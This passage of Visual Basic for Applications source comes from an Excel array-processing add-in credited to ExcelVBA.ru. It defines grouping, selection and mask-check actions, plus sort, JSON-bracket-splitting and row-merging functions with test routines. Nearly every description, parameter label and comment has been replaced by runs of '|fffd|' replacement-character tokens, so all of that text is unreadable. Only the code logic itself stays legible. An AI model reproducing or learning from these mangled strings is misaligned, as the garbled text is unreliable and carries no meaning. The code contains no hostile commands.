            "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| [1,[11,12]]  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| [2]  |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| [3,[31,[1,5],32]]" & vbNewLine & _
            "|fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| [ |fffd| ] |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    End With
    
    With AAs.AddAction(fc_Array, "GroupArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 20.000 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 100 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 200 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd|.|fffd|. |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), " & _
            "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| 200 |fffd||fffd||fffd||fffd||fffd||fffd|)"
        
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("2", "3", "50", "100", "200"), "100"
    End With
    
    With AAs.AddAction(fc_Array, "SelectItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|URL||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|), " & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "DefaultMode", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "2 - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "3 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"), "1 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "AvailableMode", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
        .AddParameter "Column", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2", "3", "4"), ""
        .AddParameter "DefaultSelection", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("-1 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "0 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "1", "2", "1|5|8 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "1"
        .AddParameter "Caption", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        .AddParameter "IfKeyPressed", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "Ctrl", "Shift"), ""
    End With
    
End Sub


Function SortArray(ByRef arr, Optional ByVal SortOrder As XlSortOrder, _
        Optional ByVal SortAsNumbers As Boolean, Optional ByVal col& = 1)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) arr
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| col& - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| col1|col2|col3
    If col& < 1 Then col& = 1
    On Error Resume Next
    
    Dim Check As Boolean, i As Long, j As Long, tmpArr(0 To 1) As Variant
    ReDim SourceArr(LBound(arr) To UBound(arr), 0 To 1)
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For i = LBound(arr) To UBound(arr)
        SourceArr(i, 0) = arr(i)        ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        SourceArr(i, 1) = Split(arr(i), "|")(col& - 1) & " "        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If SortAsNumbers Then SourceArr(i, 1) = Val(Replace(Replace(SourceArr(i, 1), ",", "."), " ", ""))        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    Next i
    
    Do Until Check
        Check = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
        For i = LBound(SourceArr, 1) To UBound(SourceArr, 1) - 1
            If SourceArr(i, 1) > SourceArr(i + 1, 1) Then
                For j = LBound(SourceArr, 2) To UBound(SourceArr, 2)
                    tmpArr(j) = SourceArr(i, j)
                    SourceArr(i, j) = SourceArr(i + 1, j)
                    SourceArr(i + 1, j) = tmpArr(j)
                    Check = False
                Next
            End If
        Next
    Loop
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = LBound(arr) To UBound(arr)
        arr(i) = SourceArr(IIf(SortOrder = xlAscending, i, UBound(arr) - i), 0)
    Next i
End Function

Private Sub test_Get_JSON_Array()
    Dim res$, txt$
    txt = "[198538,""Avp555"","""",[1318.45,1165],88052.24,false,[41059,""avp555""],[""pamm.ecn.mt4"",100],[10953,10],1165,4],[198538,""Avp555"","""",[1318.45,1165],88052.24,false,[41059,""avp555""],[""pamm.ecn.mt4"",100],[10953,10],1165,4],[198538,""Avp555"","""",[1318.45,1165],88052.24,false,[41059,""avp555""],[""pamm.ecn.mt4"",100],[10953,10],1165,4],[198538,""Avp555"","""",[1318.45,1165],88052.24,false,[41059,""avp555""],[""pamm.ecn.mt4"",100],[10953,10],1165,4]"
    res = Get_JSON_Array(txt$)
    MsgBox UBound(Split(res, ARSEP)) + 1
    ShowText Replace(res, ARSEP, vbNewLine)
End Sub

Function Get_JSON_Array(ByVal txt As String) As String
    On Error Resume Next
    'Dim TimeStamp As Double, ProcessTime$: TimeStamp = Timer
    Dim i&, cnt&, Start&, coll As New Collection
    For i = 1 To Len(txt)
        Select Case Mid(txt, i, 1)
            Case "["
                If cnt& = 0 Then Start& = i
                cnt& = cnt& + 1
            Case "]"
                cnt& = cnt& - 1
                If cnt& = 0 Then coll.Add Mid(txt, Start&, i - Start& + 1)
        End Select
    Next
    If coll.Count = 0 Then Exit Function
    ReDim arr(1 To coll.Count) As String
    For i = 1 To coll.Count
        arr(i) = coll(i)
    Next
    Get_JSON_Array = Join(arr, ARSEP)
    'Debug.Print Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."
End Function

Private Sub test_JoinedArrayEx()
    Dim arr, i&
    arr = Array("|fffd||fffd||fffd||fffd||fffd||fffd| XL|350 |fffd||fffd||fffd||5", "|fffd||fffd||fffd||fffd||fffd||fffd| M|300 |fffd||fffd||fffd||7", "|fffd||fffd||fffd||fffd||fffd||fffd| S|300 |fffd||fffd||fffd||8")
    
    For i = LBound(arr) To UBound(arr)
        Debug.Print arr(i)
    Next i
    Debug.Print
    
    arr = JoinedArrayEx(arr, 2, 3, 1, ";")
    
    For i = LBound(arr) To UBound(arr)
        Debug.Print arr(i)
    Next i
    
End Sub

Function JoinedArrayEx(ByVal Sarr As Variant, ByVal ComparedColumn As Long, _
        Optional ByVal ColumnsToSum As String, Optional ByVal ColumnsToJoin As String, _
        Optional ByVal JoinSeparator As String = ", ") As Variant
    '     |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    '     |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ComparedColumn,
    '     |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    '     ---------------------------------------------
    '     |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|:
    '     - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ColumnsToSum
    '     - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| JoinSeparator) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    '       |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ColumnsToJoin
    '     ---------------------------------------------
    '     |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    
    
    On Error Resume Next
    If Not IsArray(Sarr) Then Exit Function
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim i&, j&, ColumnsCount&, n&, RO As Variant
    For i = LBound(Sarr) To UBound(Sarr)
        If Len(Sarr(i)) Then
            n& = Len(Sarr(i)) - Len(Replace(Sarr(i), "|", ""))
            If n& + 1 > ColumnsCount& Then ColumnsCount& = n& + 1
        End If
    Next i
    If ColumnsCount& = 0 Then Exit Function
    
    If ComparedColumn > ColumnsCount& Then Exit Function
    If ComparedColumn < 1 Then Exit Function
    
    
    ReDim arr(LBound(Sarr) To UBound(Sarr), 1 To ColumnsCount&)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For i = LBound(Sarr) To UBound(Sarr)
        RO = "": RO = Split(Sarr(i), "|")
        For j = 1 To ColumnsCount&
            arr(i, j) = RO(j - 1)
        Next j
    Next i
    
    Dim col, nCol&
    
    For i = LBound(arr, 1) To UBound(arr, 1)
        If arr(i, ComparedColumn) <> "" Then
            For j = i + 1 To UBound(arr, 1)
                If arr(j, ComparedColumn) = arr(i, ComparedColumn) Then
                    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    arr(j, ComparedColumn) = Empty    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    For Each col In Split(ColumnsToSum, ",")
                        nCol = Val(Trim(col))
                        If nCol > 0 And nCol <= UBound(arr, 2) And nCol <> ComparedColumn Then
                            arr(i, nCol) = Val(Replace(arr(i, nCol), ",", ".")) _
                                + Val(Replace(arr(j, nCol), ",", "."))
                        End If
                    Next
                    
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                    For Each col In Split(ColumnsToJoin, ",")
                        nCol = Val(Trim(col))
                        If nCol > 0 And nCol <= UBound(arr, 2) And nCol <> ComparedColumn Then
                            If Len(Trim(arr(j, nCol))) > 0 Then
                                arr(i, nCol) = Trim(arr(i, nCol)) & JoinSeparator & Trim(arr(j, nCol))
                            End If
                        End If
                    Next
                End If
            Next j
        End If
    Next i
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd|
    Dim iCount As Long
    For i = LBound(arr) To UBound(arr)
        iCount = iCount - (arr(i, ComparedColumn) <> "")   ' |fffd||fffd||fffd|-|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    Next i
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ReDim narr(LBound(arr, 1) To iCount + LBound(arr, 1) - 1)
    
    iCount = LBound(narr)    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    For i = LBound(arr, 1) To UBound(arr, 1)
        If arr(i, ComparedColumn) <> "" Then
            For j = LBound(arr, 2) To UBound(arr, 2)
                narr(iCount) = narr(iCount) & "|" & arr(i, j)
            Next j
            narr(iCount) = Mid(narr(iCount), 2)
            iCount = iCount + 1
        End If
    Next i
    
    JoinedArrayEx = narr
End Function

Attribute VB_Name = "mod_AAs_CHECK"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_CHECK
' Author        : EducatedFool                     Date: 31.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Check(ByRef AAs As ArrayActions)
    On Error Resume Next

    With AAs.AddAction(fc_Check, "CheckMask", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| /|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| * ? # [A-z] [!|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]"

        .AddParameter "Pattern", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "MatchCase", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Replacement", aps_Text, "|fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    End With

    With AAs.AddAction(fc_Check, "CheckCondition", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
